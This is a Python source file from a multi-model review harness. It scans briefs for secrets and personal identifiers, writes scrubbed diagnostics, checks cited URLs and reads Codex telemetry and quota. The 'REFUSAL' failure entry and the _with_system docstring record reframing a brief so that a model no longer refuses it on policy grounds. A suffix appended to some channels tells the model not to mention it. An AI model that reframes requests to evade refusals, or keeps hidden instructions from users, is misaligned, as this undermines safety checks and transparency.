    ("DATE_OF_BIRTH",  re.compile(r"(?i)\b(?:date\s+of\s+birth|d\.?o\.?b\.?|дата\s+рождения)"
                                  r"[\s:=—-]*(?:is|born)?[\s:=—-]*"
                                  r"(?:\d{1,4}[./\-]\d{1,2}[./\-]\d{1,4}"        # 1988-04-12, 4/12/88
                                  r"|\d{1,2}\s+[A-Za-zА-Яа-я]{3,}\.?\s+\d{4}"    # 12 April 1988
                                  r"|[A-Za-zА-Яа-я]{3,}\.?\s+\d{1,2},?\s+\d{4})")),  # April 12, 1988
    # Same failure, same fix: a passport number is an identifier, so require one - six to twelve
    # alphanumerics containing at least one digit - rather than "any next character". The digit is
    # what keeps "the passport number fields are blank" from matching on the word "fields".
    ("PASSPORT_LABEL", re.compile(r"(?i)\b(?:passport\s*(?:no\.?|number|#)|номер\s+паспорта)"
                                  r"[\s:=№-]*"
                                  r"(?=[A-Za-z0-9]{6,12}(?![A-Za-z0-9]))"
                                  r"[A-Za-z0-9]*\d[A-Za-z0-9]*")),
]


def scan_payload(text, label):
    """
    Return (secrets, pii): lists of "KIND at LABEL line N (len M)" strings, deduplicated.

    No match text is ever included. See the block comment above for why that is deliberate.
    """
    secrets, pii = [], []
    for lineno, line in enumerate((text or "").splitlines(), 1):
        for bucket, patterns in ((secrets, SECRET_PATTERNS), (pii, PII_PATTERNS)):
            for kind, rx in patterns:
                for m in rx.finditer(line):
                    hit = "%s at %s line %d (%d chars)" % (kind, label, lineno,
                                                           len(m.group()))
                    if hit not in bucket:
                        bucket.append(hit)
    return secrets, pii


def scrub(text):
    """
    Replace every secret- and PII-shaped run with a labelled placeholder.

    This is the one place in the program that REWRITES rather than reports, because
    diagnostics.json is written to be pasted into a chat or attached to a public issue, and
    "safe as long as the author remembered" is not safe.

    re.sub, never a truncation. On 2026-07-31 a real key reached a transcript through a
    "masking" expression that kept the first 60 characters of a 48-character key, i.e. all of
    it. A substitution cannot fail that way: either the pattern matched and the text is gone,
    or it did not match and nothing claimed otherwise.
    """
    if not isinstance(text, str):
        return text
    for kind, rx in SECRET_PATTERNS:
        text = rx.sub("[REDACTED:%s]" % kind, text)
    for kind, rx in PII_PATTERNS:
        text = rx.sub("[REDACTED:%s]" % kind, text)
    return text


def scrub_deep(obj):
    """scrub() over an arbitrary JSON-shaped structure, keys included."""
    if isinstance(obj, dict):
        return {scrub(k): scrub_deep(v) for k, v in obj.items()}
    if isinstance(obj, (list, tuple)):
        return [scrub_deep(v) for v in obj]
    return scrub(obj)


# Signature -> (plain-language cause, what to actually do). Matched case-insensitively against
# the error text. This is what turns diagnostics.json from a stack trace into something an
# assistant - or a non-technical user pasting the file into a chat - can act on.
KNOWN_FAILURES = [
    ("MODEL_API_KEY not set",
     "The Spark channel has no API key.",
     "Set MODEL_API_KEY, or run with --skip spark to use the other channels only. The harness "
     "is designed to run any subset of channels; a missing key is not a fatal condition."),
    ("binary not found",
     "A command-line reviewer is not installed, or is installed somewhere this program did not "
     "look.",
     # Deliberately names no channel. This advice used to say "--skip codex / --skip gemini" and
     # "CODEX_BIN=... or AGY_BIN=...", which was correct until a fourth channel was added to the
     # registry - after which a user whose KIMI channel failed was told to reconfigure Codex. The
     # channel that failed is already printed on the line above this one; repeating a frozen list
     # here could only ever go stale.
     "Either install it, or exclude that channel with --skip <channel>. If it IS installed, point "
     "the harness at it explicitly with the matching <CHANNEL>_BIN environment variable "
     "(CODEX_BIN / AGY_BIN / HERMES_BIN). `python doctor.py` reports which ones were found."),
    ("END MARKER ABSENT",
     "The model stopped before finishing, or never emitted the agreed end-of-review marker.",
     "The harness appends the marker instruction automatically when the brief does not contain "
     "it. If this still fires, the model most likely hit a length or time limit - re-run that "
     "channel alone, or lower --tier."),
    ("REFUSAL",
     "The model declined the task on policy grounds rather than failing technically.",
     "This is almost always a framing problem, not a subject ban. Rewrite the brief as "
     "verification of sources rather than as strategy or advice, and pass "
     "--system legal-research for regulated subjects."),
    ("status.*401|unauthor|invalid.*api.?key|authentication",
     "The API key was rejected by the vendor.",
     "The key is present but not valid - it was revoked, rotated, or belongs to a different "
     "account. Issue a new one and replace it in the environment."),
    ("status.*429|rate.?limit|quota|weekly limit",
     "A usage or rate limit was hit on that vendor.",
     "Wait, or route the work to another channel with --route/--skip. Do NOT switch that "
     "channel to a metered pay-per-token key to get around a subscription limit unless you "
     "have decided that cost is acceptable."),
    ("timed out|timeout",
     "The channel took longer than its allotted time.",
     "Raise the timeout for that channel, lower --tier, or split the brief into smaller "
     "questions. Deep tiers on large briefs can legitimately run for many minutes."),
    ("EMPTY ANSWER|response.*\"\"",
     "The channel returned nothing at all.",
     "On the Antigravity channel this is the classic symptom of a denied tool permission "
     "discarding the whole run - run patch_agy_permissions.py. Otherwise check the run log for "
     "an error frame."),
    ("SECRETS IN THE PAYLOAD",
     "The brief contains something shaped like a key, token or password.",
     "This is refused with no override, because a credential sent to three external vendors "
     "cannot be recalled. Remove or redact it in the brief."),
]


def diagnose(text):
    """Return (cause, fix) for an error string, or (None, None) if unrecognised."""
    for sig, cause, fix in KNOWN_FAILURES:
        if re.search(sig, text or "", re.I):
            return cause, fix
    return None, None


def write_diagnostics(outdir, payload):
    """
    Write a scrubbed, machine-readable account of the run to <outdir>/diagnostics.json.

    Written on EVERY run, not only on failure: the common support question is "it worked
    yesterday", which needs the successful run's file to compare against. Never raises - a
    diagnostics writer that can break the thing it is diagnosing is worse than none.
    """
    try:
        os.makedirs(outdir, exist_ok=True)
        payload = scrub_deep(payload)
        path = os.path.join(outdir, "diagnostics.json")
        with open(path, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2, ensure_ascii=False, default=str)
    except Exception:
        return None
    # REPORT.md beside it, from the SAME payload. The JSON has always been generated to a fixed
    # schema; the prose report was not - every session composed its own by hand, and a
    # hand-written summary omits the setting its author did not think to mention. Igor,
    # 2026-08-07: «он должен писать какой тир он выбрал ... а то вдруг он выберет слабый ответ,
    # а я это и не узнаю». A tier is invisible in the output, so it has to be structural.
    # Never fatal: a missing report must not cost the run its diagnostics.
    try:
        _here = os.path.dirname(os.path.abspath(__file__))
        if _here not in sys.path:
            sys.path.insert(0, _here)   # this module may be imported from another cwd
        import report as _report
        with open(os.path.join(outdir, "REPORT.md"), "w", encoding="utf-8") as f:
            f.write(_report.render(payload))
    except Exception as exc:
        log("  note: REPORT.md could not be rendered (%r). diagnostics.json is unaffected; "
            "run report.py against it by hand." % (exc,))
    return path


# How many cited URLs to probe per channel. A review normally cites 10-35; a runaway answer can
# cite hundreds, and probing those serially would make the check the slowest part of the run. When
# the cap bites it is REPORTED, never silent - a truncated check that reads as a complete one is
# the same lie as a citation to a page nobody opened.
CITECHECK_MAX_URLS = 60


_citecheck_reason = None      # set by --ask; see citation_audit()


def citation_audit(results, enabled=True):
    """
    Fetch every URL each channel cited and report which ones do not exist.

    WHY THIS RUNS AUTOMATICALLY. There are two different questions about a citation, and only one
    of them is answerable everywhere:

      "did the model OPEN this page?"   - grounding. Needs the channel's own tool telemetry.
                                          agy exposes it, Spark reports a count, Codex reports
                                          NOTHING. So for a third of the panel it is unanswerable.
      "does this page EXIST?"           - existence. Needs only a fetch, so it works on every
                                          channel including Codex. Weaker, but universal.

    Existence is the check that catches the dangerous failure: a fluent, correct-sounding review
    citing pages that were never opened and sometimes never existed. Measured 2026-07-31: agy cited
    11 URLs of which 3 were 404, while its conclusions were right. That combination survives a
    skim, which is exactly why a human is the wrong instrument for it.

    It used to be a separate command you had to remember to run afterwards. A verification step
    that depends on remembering is one that runs least often when the run is rushed - which is the
    same moment nobody re-reads the citations either. So: on by default, `--no-citecheck` to turn
    it off.

    Deliberately does NOT affect the exit code. A 404 is information for the reader, not a verdict:
    one measured "dead" citation was a GitHub API query for a tag that does not exist, i.e. the 404
    WAS the answer. Failing a run on that would teach people to ignore the check, and a gate that
    gets ignored protects nothing.

    Never raises. Costs nothing at either vendor - it is plain HTTP to the cited hosts.
    """
    out = {}
    if not enabled:
        # 🔴 THE REASON USED TO NAME A FLAG THE USER HAD NOT PASSED. `--ask` sets
        # a.no_citecheck internally (a lookup is not a review), and this line then printed
        # "Citation check skipped: disabled with --no-citecheck" - so the log blamed an
        # instruction nobody gave. Caught 2026-08-08 in a live --ask run. A message that
        # attributes a behaviour to the wrong cause is worse than no message: it sends the
        # reader to check a flag that is not there.
        return {"skipped": _citecheck_reason or "disabled with --no-citecheck"}
    try:
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        from citecheck import URL_RE, probe_url, resolve_all
    except Exception as exc:
        # A partial install is a supported state, so this is a note, not a failure.
        return {"skipped": "citecheck.py unavailable (%s)" % type(exc).__name__}

    for name, r in results.items():
        text = r.get("text") or ""
        if not text:
            continue
        seen, urls = set(), []
        for u in URL_RE.findall(text):
            u = u.rstrip(".,;:")          # prose punctuation is not part of the URL
            if u not in seen:
                seen.add(u)
                urls.append(u)
        if not urls:
            out[name] = {"cited": 0}
            continue
        probed, dropped = urls[:CITECHECK_MAX_URLS], max(0, len(urls) - CITECHECK_MAX_URLS)
        try:
            verdicts = resolve_all(probed)
        except Exception as exc:
            out[name] = {"cited": len(urls), "error": type(exc).__name__}
            continue
        tally, detail = {}, []
        for u, (v, why) in zip(probed, verdicts):
            tally[v] = tally.get(v, 0) + 1
            if v in ("DEAD", "MOVED", "UNKNOWN"):
                detail.append({"verdict": v, "url": u, "note": why})
        entry = {"cited": len(urls), "probed": len(probed), "tally": tally,
                 "dead": tally.get("DEAD", 0), "flagged": detail}
        if dropped:
            entry["not_probed"] = dropped
            entry["not_probed_note"] = ("cap of %d per channel; these were NOT checked and are "
                                        "not counted as live" % CITECHECK_MAX_URLS)
        out[name] = entry
    return out


def log_citation_audit(audit):
    """Print the citation audit. BLOCKED/UNKNOWN are never called fabrication."""
    if not audit or "skipped" in audit:
        if audit.get("skipped"):
            log("\nCitation check skipped: %s" % audit["skipped"])
        return
    log("\nCitation existence check (no vendor cost; fetches the cited pages directly):")
    for name, e in sorted(audit.items()):
        if e.get("error"):
            log("  [%s] could not check (%s) - this is NOT evidence against the citations"
                % (name, e["error"]))
            continue
        if not e.get("cited"):
            log("  [%s] cited no URLs" % name)
            continue
        counts = "  ".join("%s=%d" % (k, v) for k, v in sorted(e.get("tally", {}).items()))
        log("  [%s] %d cited, %d probed  %s" % (name, e["cited"], e.get("probed", 0), counts))
        if e.get("not_probed"):
            log("      %d URL(s) beyond the per-channel cap were NOT checked" % e["not_probed"])
        for d in e.get("flagged", []):
            # The URL is not truncated. It is the one thing on this line the reader has to be able
            # to copy and open, and a shortened URL that looks whole is its own small lie.
            log("      %-8s %s %s" % (d["verdict"], d["url"], (d["note"] or "")[:40]))
        if e.get("dead"):
            log("      %d cited URL(s) return 404/410. A citation to a page that does not exist "
                "was not read - it was constructed. Check what it was supporting." % e["dead"])
    log("  BLOCKED/UNKNOWN mean the check could not be completed, never that a source is fake.")


def environment_report(want=()):
    """Facts about this machine that determine whether a run can work. No secret values."""
    key = os.environ.get("MODEL_API_KEY") or ""
    if not key and os.name == "nt":
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment") as reg:
                key = winreg.QueryValueEx(reg, "MODEL_API_KEY")[0]
        except OSError:
            key = ""
    env = {
        "python": sys.version.split()[0],
        "platform": platform.platform(),
        "os_name": os.name,
        "cwd": os.getcwd(),
        "skill_dir": os.path.dirname(os.path.abspath(__file__)),
        # Presence and length only. Printing the value is the failure this whole file guards.
        "spark_key_present": bool(key),
        "spark_key_length": len(key),
        "spark_endpoint": os.environ.get("MODEL_API_BASE", "https://api.meta.ai/v1"),
    }
    # Keyed on the BINARY each entry actually probes, not on a channel that once used it:
    # `kimi_installed` reported the presence of the Hermes CLI, which the kimi channel stopped
    # using on 2026-08-03 - a true value about the wrong thing, which is worse than a missing one.
    for name, resolver in (("codex", codex_bin), ("agy", agy_bin), ("hermes", hermes_bin)):
        try:
            b = resolver()
            found = bool(os.path.isfile(b) or shutil.which(b))
            env[name + "_path"] = b
            env[name + "_installed"] = found
            env[name + "_version"] = _binary_version(b) if found else None
        except Exception as exc:
            env[name + "_installed"] = False
            env[name + "_error"] = repr(exc)
    return env


def _binary_version(binary):
    """Ask the binary what it is. Never assert a version in prose - both CLIs moved inside a week."""
    try:
        p = subprocess.run([binary, "--version"], capture_output=True, text=True, timeout=20)
        return (p.stdout or p.stderr or "").strip().splitlines()[0][:80] or None
    except Exception:
        return None


def pii_gate(parts, strict_pii=False):
    """
    parts: list of (label, text). Returns an exit code to propagate, or 0 to continue.

    Runs before --dry-run returns, so --dry-run is a complete preflight: the whole point of a
    free check is that it tells you everything a paid run would have told you.

    Two severities, and they are deliberately not symmetric. SECRETS are a hard refusal with no
    override at any setting - a key sent to three vendors cannot be recalled and its blast radius
    is everything that key opens. PERSONAL IDENTIFIERS warn loudly and send, unless --strict-pii
    restores the block. The argument used to be spelled `allow_pii` and defaulted to blocking;
    it is inverted here rather than renamed in place so that a stale caller passing the old
    positional value fails visibly instead of silently flipping the policy.
    """
    secrets, pii = [], []
    for label, text in parts:
        s, p = scan_payload(text, label)
        secrets += s
        pii += p

    if secrets:
        log("\n*** SECRETS IN THE PAYLOAD - REFUSING TO SEND ***")
        for h in secrets:
            log("    " + h)
        log("    A key or token would go to three external vendors and cannot be recalled. There\n"
            "    is no --allow flag for this: remove it from the brief. If it is a false positive\n"
            "    (a placeholder, a documented example), rename the variable or redact the value.")
        return 3
    if pii and strict_pii:
        log("\n*** PERSONAL IDENTIFIERS IN THE PAYLOAD - NOT SENT (--strict-pii) ***")
        for h in pii:
            log("    " + h)
        log("    Tokenize these in the SENT copy only - never edit the source of record. Replace\n"
            "    with APPLICANT_1 / [A-NUMBER] / [RECEIPT] and tell the model the placeholders\n"
            "    are expected; a reviewer never needs the real identifiers to review reasoning.\n"
            "    Line numbers are given without the values on purpose - this console output is\n"
            "    read by the orchestrating model, and printing them here would leak them into the\n"
            "    transcript, which is the same mistake one step earlier.\n"
            "    Drop --strict-pii to send anyway.")
        return 3
    if pii:
        # 🔴 WARN, DO NOT BLOCK - changed 2026-08-07 on Igor's explicit instruction: «если данные
        # и утекут, это не критично, поэтому правила ослабляй, кроме паролей и api ключей».
        # Secrets above are untouched and still have no override, because that is the exception
        # he named.
        #
        # There is a second reason, independent of the instruction, and it is the stronger one.
        # A gate that blocks on identifiers has a high false-positive rate on real legal and
        # medical material, and this project has already measured what that does: «a false
        # positive in a safety gate is worse than a miss - it teaches you to pass the override by
        # reflex, which disables the class.» The override had become automatic, and an override
        # applied without reading is not a decision. Worse, it was measured doing exactly that:
        # 15 refused spans were fictional, which made --allow-pii look obvious, and 5 REAL ones
        # were sitting in the same diff. A loud, unavoidable, itemised warning that cannot be
        # switched off is a better instrument than a block with a habitual bypass.
        log("\n  ⚠ PERSONAL IDENTIFIERS ARE BEING SENT - %d found, listed by kind and line, "
            "never by value:" % len(pii))
        for h in pii:
            log("      " + h)
        log("    Sending publishes them to every enabled channel and cannot be undone. Some "
            "channels\n"
            "    are worse than others: a CONTRIBUTOR-tier channel may train on this. Re-run with "
            "--strict-pii\n"
            "    to make this a hard stop again, or --dry-run to see the list without sending.")
    return 0


def _resolve_system(name):
    """
    Find a system-prompt file no matter which project you are standing in.

    This script is invoked by absolute path from any chat, in any project, so a bare
    `--system systems/legal-research.md` resolved against the CURRENT directory - which is
    almost never the skill directory - and died with FileNotFoundError everywhere except here.
    Try the literal path first (so an ad-hoc file still works), then the skill's own presets,
    and accept a bare preset name: `--system legal-research`.
    """
    cands = [name,
             os.path.join(SKILL_DIR, name),
             os.path.join(SKILL_DIR, "systems", name),
             os.path.join(SKILL_DIR, "systems", name + ".md")]
    for c in cands:
        if os.path.isfile(c):
            return c
    presets = []
    sysdir = os.path.join(SKILL_DIR, "systems")
    if os.path.isdir(sysdir):
        presets = [os.path.splitext(f)[0] for f in sorted(os.listdir(sysdir)) if f.endswith(".md")]
    raise SystemExit("--system %r not found. Built-in presets: %s (a path is also accepted)"
                     % (name, ", ".join(presets) or "(none)"))


def _with_system(brief, system):
    """
    Only the HTTPS channel has a real `system` slot. Codex takes one prompt on stdin and agy
    takes one on argv, so for them the system layer has to ride in front of the brief.

    This is not cosmetic. A brief framed as "review this filing strategy" gets REFUSED by Codex
    on policy grounds (measured 2026-07-31), and the refusal still ends with the end marker, so
    it passes every mechanical check. The same underlying question, framed as source-verification
    for attorney review, is answered. The framing therefore has to reach every channel that can
    refuse - which was all of them except http.
    """
    if not system:
        return brief
    return system.rstrip() + "\n\n---\n\n" + brief


def _system_for(system, slot):
    """The shared system layer plus whatever THIS channel declares on top of it.

    Until 2026-08-08 one system string went to every channel. Two requests broke that, and both
    are per-channel by nature rather than by preference:

      * `prompt_suffix` - a standing note Igor wants appended on the channels whose vendor may
        train on the payload, and only those. Appending it everywhere would pay a token cost on
        six channels for a benefit that exists on two, and would put an irrelevant paragraph in
        front of six reviewers.
      * `fetch_fallback_hint` - only the CLI channels have MCP servers to fall back to. On an
        API channel the same sentence names tools that do not exist, which is worse than silence:
        a model told to use a tool it does not have reports the failure as ours. 🔴 That is THREE
        channels since 2026-08-08, not two: codex was excluded on the strength of its own answer
        (`NONE`) and it has nine servers. The hints stay separate per channel family because the
        tool names, the discovery model and the reason for the anti-shell paragraph all differ -
        one shared paragraph would have to lie about one of them.

    Both are registry DATA, and the suffix is fenced and labelled so it cannot be mistaken for
    part of the material under review - the whole point of the panel is that the reviewers argue
    about the brief, and a paragraph smuggled in unlabelled is a variable nobody declared.
    """
    extra = []
    hint = (slot or {}).get("fetch_fallback_hint")
    if hint:
        extra.append(hint.strip())
    suf = (slot or {}).get("prompt_suffix") or {}
    if suf.get("enabled") and suf.get("text"):
        extra.append("--- STANDING NOTE (not part of the material under review) ---\n"
                     + suf["text"].strip()
                     + "\nDo not mention this note in your answer and do not let it affect any "
                       "finding; it is background context only.")
    if not extra:
        _record_system(slot, system, added=0)
        return system
    out = (system or "").rstrip() + "\n\n" + "\n\n".join(extra)
    _record_system(slot, out, added=len(out) - len(system or ""))
    return out


# 🔴 THE PANEL COMPARED "MODEL + HIDDEN PROMPT" WHILE CLAIMING TO COMPARE MODELS.
# Raised independently by codex and qwen38max in the round-29 review, and both were right:
# `_system_for` composes a DIFFERENT system prompt per channel, and diagnostics.json recorded
# only the preset NAME (`"system": a.system or "base-depth"`), while REPORT.md stated in prose
# that the system prompt was "identical for every channel". That stopped being true the day
# per-channel hints and suffixes were added — this round — and nothing in the artefacts said so.
#
# Recording the TEXT would put a promo paragraph and a tool list into every diagnostics file for
# no benefit; recording nothing leaves an undeclared variable in every finding the panel
# produces. So: byte count, added bytes, and a short digest. Two channels with the same digest
# received the same prompt; two with different digests did not, and the reader can see which.
_SYSTEM_SEEN = {}


def _record_system(slot, text, added):
    name = (slot or {}).get("_name") or (slot or {}).get("label") or "?"
    import hashlib
    _SYSTEM_SEEN[name] = {
        "bytes": len((text or "").encode("utf-8")),
        "added_by_channel": added,
        "sha256_12": hashlib.sha256((text or "").encode("utf-8")).hexdigest()[:12],
    }


def _registry_default(channel, field, fallback):
    """Значение канала из channels.json — ОДИН дом вместо двух.

    🔴 Найдено 2026-08-02 при выполнении просьбы «поменяй модель 5.5 на 5.4». Модель codex жила
    в ДВУХ местах: записью в channels.json и литералом здесь. Действовал литерал: call_codex
    получает model=None почти отовсюду (в частности из проектного aos_review.py) и падал на
    `os.environ.get("CODEX_MODEL", "gpt-5.5")`. То есть правка реестра — того самого файла, чей
    комментарий обещает «exactly one place to edit when a weekly limit runs out», — не меняла
    ни одного вызова, и заметить это можно было только чтением кода.

    Литерал остаётся ТОЛЬКО как аварийный запас: реестр может быть повреждён или недоступен, и
    тогда лучше дорогой запуск на разумной модели, чем падение посреди раунда.
    """
    try:
        p = os.path.join(os.path.dirname(os.path.abspath(__file__)), "channels.json")
        with open(p, encoding="utf-8") as fh:
            v = json.load(fh)["channels"][channel].get(field)
        return v or fallback
    except Exception:                                     # noqa: BLE001
        return fallback


def codex_postmortem(started_after=None):
    """What codex was doing when it died, read from ITS OWN rollout log.

    🔴 Codex reports no telemetry to us and writes its report only at the very end, so a killed run
    used to leave literally nothing: the harness printed `[codex] PROBLEM ?s  timed out` and the
    suggested fix was "raise the timeout" - advice that was both unactionable (no codex timeout
    existed to raise) and wrong (it had been idle for 33 of its 50 minutes).

    But codex DOES keep a full rollout at ~/.codex/sessions/YYYY/MM/DD/rollout-*.jsonl, and that
    file answered every question in five minutes once anyone thought to open it: the sandbox error,
    the token trajectory, and a token counter frozen at 823 376 in for 33 minutes while the last
    record was a `web_search_call` with an EMPTY query. Returns a short human-readable diagnosis;
    never raises, because a post-mortem that can fail takes the corpse with it.
    """
    try:
        root = os.path.join(os.path.expanduser("~"), ".codex", "sessions")
        newest, newest_m = None, 0
        for dirpath, _dirnames, filenames in os.walk(root):
            for fn in filenames:
                if fn.startswith("rollout-") and fn.endswith(".jsonl"):
                    p = os.path.join(dirpath, fn)
                    m = os.path.getmtime(p)
                    if m > newest_m and (started_after is None or m >= started_after - 60):
                        newest, newest_m = p, m
        if not newest:
            return None
        rows = []
        with open(newest, encoding="utf-8", errors="replace") as f:
            for line in f:
                line = line.strip()
                if line:
                    try:
                        rows.append(json.loads(line))
                    except ValueError:
                        pass
        sandbox_errs, toks, last_kind, last_ts = 0, [], "", ""
        for r in rows:
            pay = r.get("payload")
            if not isinstance(pay, dict):
                continue
            k = pay.get("type") or ""
            if k:
                last_kind, last_ts = k, r.get("timestamp", "")
            if k == "function_call_output" and "windows sandbox" in str(pay.get("output", "")):
                sandbox_errs += 1
            if k == "token_count":
                t = (pay.get("info") or {}).get("total_token_usage") or {}
                toks.append((r.get("timestamp", ""), t.get("input_tokens"), t.get("output_tokens")))
        bits = ["rollout %s (%d records)" % (os.path.basename(newest), len(rows))]
        if sandbox_errs:
            bits.append("%d shell command(s) failed with a Windows sandbox spawn error - the shell "
                        "tool is DEAD on this machine; see sandbox_shell_dir()" % sandbox_errs)
        if toks:
            frozen = sum(1 for i in range(1, len(toks)) if toks[i][1:] == toks[i - 1][1:])
            bits.append("tokens in=%s out=%s at the end; %d of %d counter ticks showed NO progress"
                        % (toks[-1][1], toks[-1][2], frozen, len(toks) - 1))
            if frozen and frozen >= (len(toks) - 1) / 2.0:
                bits.append("STALLED, not slow: the model stopped consuming tokens long before it "
                            "was killed. Raising the timeout will not help")
        bits.append("last record: %s at %s" % (last_kind or "?", last_ts or "?"))
        return " | ".join(bits)
    except Exception as exc:                                              # noqa: BLE001
        return "post-mortem unavailable (%s)" % type(exc).__name__


def _parse_codex_events(path):
    """Token usage for the one channel this harness kept calling un-instrumented.

    `codex exec --json` writes JSONL to stdout. Measured on codex-cli 0.147.0, a whole run is
    four event types: thread.started, turn.started, item.completed, turn.completed - and the last
    one carries::

        {"type":"turn.completed","usage":{"input_tokens":20298,"cached_input_tokens":1920,
         "cache_write_input_tokens":0,"output_tokens":19,"reasoning_output_tokens":10}}

    Two things this parser must survive, both observed rather than imagined:

    NON-JSON LINES ARE INTERLEAVED. The Rust MCP transport logs to the same stream
    (`ERROR rmcp::transport::worker: worker quit with fatal ...`). A parser that assumed every
    line is JSON would die on an unrelated GitLab auth warning and report no tokens at all -
    which is indistinguishable from the vendor not reporting any, i.e. exactly the false belief
    this function exists to end.

    THE SCHEMA IS NOT PROMISED. If the field names move, every value below goes to None and the
    caller prints what it has. A telemetry reader must never be able to fail a run: the numbers
    are why we look, not why we ran.
    """
    out = {}
    if not path or not os.path.exists(path):
        return out
    usage, turns, msgs = None, 0, 0
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            for line in f:
                line = line.strip()
                if not line.startswith("{"):
                    continue                       # stderr from the MCP transport; not ours
                try:
                    ev = json.loads(line)
                except ValueError:
                    continue
                kind = ev.get("type")
                if kind == "turn.completed":
                    turns += 1
                    if isinstance(ev.get("usage"), dict):
                        usage = ev["usage"]        # last one wins: it is cumulative for the turn
                elif kind == "item.completed":
                    if ((ev.get("item") or {}).get("type")) == "agent_message":
                        msgs += 1
    except OSError:
        return out
    if turns:
        out["turns"] = turns
    if msgs:
        out["agent_messages"] = msgs
    if usage:
        out["in_tokens"] = usage.get("input_tokens")
        out["out_tokens"] = usage.get("output_tokens")
        out["reasoning_tokens"] = usage.get("reasoning_output_tokens")
        out["cached_in_tokens"] = usage.get("cached_input_tokens")
        # The counterpart to the note in _verify_http. Here `cached_input_tokens` is documented by
        # OpenAI as a SUBSET of `input_tokens`, so the total is input_tokens and adding the two
        # would double-count - the exact opposite of the Meta/Messages channel, where they are
        # disjoint and MUST be added. Both conventions are stated on the record they belong to so
        # that a report comparing channels cannot quietly pick one rule for both.
        # 🔴 SUBSET is INFERRED from the vendor's documented convention, not measured here; the
        # Meta side WAS measured. To settle it, send one codex turn with a prefix known to be
        # cached and check whether in_tokens stays at the full prompt size or collapses.
        out["in_tokens_total"] = usage.get("input_tokens")
        out["cache_convention"] = ("subset (total = input_tokens, which already contains "
                                   "cached_input_tokens); INFERRED from OpenAI's documented "
                                   "convention, not measured on this channel")
    return out


def codex_rate_limits(workdir, started_after=None):
    """How much of the weekly subscription this account has left, from codex's own rollout.

    Igor runs this channel on a ChatGPT subscription with a hard weekly window, and the harness
    had no way to see it - so an expensive round could be launched against an exhausted limit and
    only discover it by the answer coming back thin. Round 25 ran at **used_percent 100.0** and
    nothing anywhere said so; it completed on plan credits.

    The rollout is matched on `session_meta.cwd` == the workspace we handed this run, NOT on
    newest-mtime. Two channels can be in flight at once and the operator may have an interactive
    codex open in another window; picking the newest file would attribute a stranger's numbers to
    this run, which is worse than reporting nothing. Returns None rather than raising, for the
    same reason as the post-mortem: an accounting read must not be able to kill the run.
    """
    try:
        root = os.path.join(os.path.expanduser("~"), ".codex", "sessions")
        want = os.path.normcase(os.path.abspath(workdir))
        best, best_m = None, 0
        for dirpath, _dirnames, filenames in os.walk(root):
            for fn in filenames:
                if not (fn.startswith("rollout-") and fn.endswith(".jsonl")):
                    continue
                p = os.path.join(dirpath, fn)
                m = os.path.getmtime(p)
                if m <= best_m or (started_after is not None and m < started_after - 60):
                    continue
                with open(p, encoding="utf-8", errors="replace") as f:
                    head = f.readline()
                try:
                    meta = json.loads(head).get("payload") or {}
                except ValueError:
                    continue
                if os.path.normcase(os.path.abspath(meta.get("cwd") or "")) == want:
                    best, best_m = p, m
        if not best:
            return None
        limits, window = None, None
        with open(best, encoding="utf-8", errors="replace") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    r = json.loads(line)
                except ValueError:
                    continue
                pay = r.get("payload")
                if isinstance(pay, dict) and pay.get("type") == "token_count":
                    if isinstance(pay.get("rate_limits"), dict):
                        limits = pay["rate_limits"]
                    window = ((pay.get("info") or {}).get("model_context_window")) or window
        if not limits:
            return None
        pri = limits.get("primary") or {}
        out = {"used_percent": pri.get("used_percent"),
               "window_minutes": pri.get("window_minutes"),
               "plan_type": limits.get("plan_type"),
               "has_credits": (limits.get("credits") or {}).get("has_credits"),
               "context_window": window,
               "rollout": best}
        if pri.get("resets_at"):
            try:
                out["resets_at"] = datetime.datetime.fromtimestamp(
                    pri["resets_at"]).isoformat(timespec="seconds")
            except (OverflowError, OSError, ValueError):
                pass
        return out
    except Exception:
        return None


def codex_quota_snapshot(timeout=12):
    """How much of the weekly ChatGPT window is left - BEFORE the round, for free.

    This is the one preflight that could not previously exist. Igor runs this channel on a
    subscription with a hard 7-day window, and the only way to discover it was exhausted was to
    spend 20-40 minutes finding out. Round 25 ran at 100% used and nothing said so.

    `codex app-server` speaks JSON-RPC over stdio and answers `account/rateLimits/read` in about
    half a second with NO model turn and NO token spend - measured 0.50s on this machine
    2026-08-07, returning usedPercent 100 on a 10080-minute window.

    🔴 IT IS A CACHED SNAPSHOT, NOT A LIVE READING, and that limitation is architectural rather
    than a gap someone will close. From the Codex maintainer on issue #10233, verbatim: «much of
    the information that /status displays is valid only within the context of a thread. Usage
    limits are returned to the client by the responses endpoint. They're returned as HTTP
    headers. A responses call requires a thread.» So the numbers come from the last real call.
    That makes this reliable for "am I already exhausted" - the case that matters - and unable to
    see quota consumed by another client since. Upstream issue #33897 reports staleness on first
    read. Never gate a run on it; report it and let the human decide.

    Field names differ between the two places this data appears: app-server v2 is camelCase
    (usedPercent / windowDurationMins / resetsAt / planType) while the rollout JSONL is
    snake_case. Both are read, because assuming one naming is how a reader silently returns None.

    Returns a human-readable line, or None. Never raises: a quota reading must not be able to
    stop a round that the operator has already decided to pay for.
    """
    try:
        binary = codex_bin()
        if not (os.path.isfile(binary) or shutil.which(binary)):
            return None
        proc = subprocess.Popen([binary, "app-server"],
                                stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.DEVNULL, text=True,
                                encoding="utf-8", errors="replace", bufsize=1)
    except Exception:
        return None
    try:
        for msg in ({"jsonrpc": "2.0", "id": 1, "method": "initialize",
                     "params": {"clientInfo": {"name": "orchestrate",
                                               "title": "orchestrate", "version": "1"}}},
                    {"jsonrpc": "2.0", "method": "initialized", "params": {}},
                    {"jsonrpc": "2.0", "id": 7, "method": "account/rateLimits/read",
                     "params": {}}):
            proc.stdin.write(json.dumps(msg) + "\n")
        proc.stdin.flush()
        deadline, got = time.time() + timeout, None
        while time.time() < deadline:
            line = proc.stdout.readline()
            if not line:
                break
            try:
                m = json.loads(line)
            except ValueError:
                continue
            if m.get("id") == 7:
                got = m
                break
        if not got:
            return None
        if got.get("error"):
            # -32001 "Server overloaded; retry later" is documented. Not worth a retry here:
            # this is an optional courtesy reading in front of a run that is about to happen.
            return None
        rl = ((got.get("result") or {}).get("rateLimits") or {})
        pri = rl.get("primary") or {}
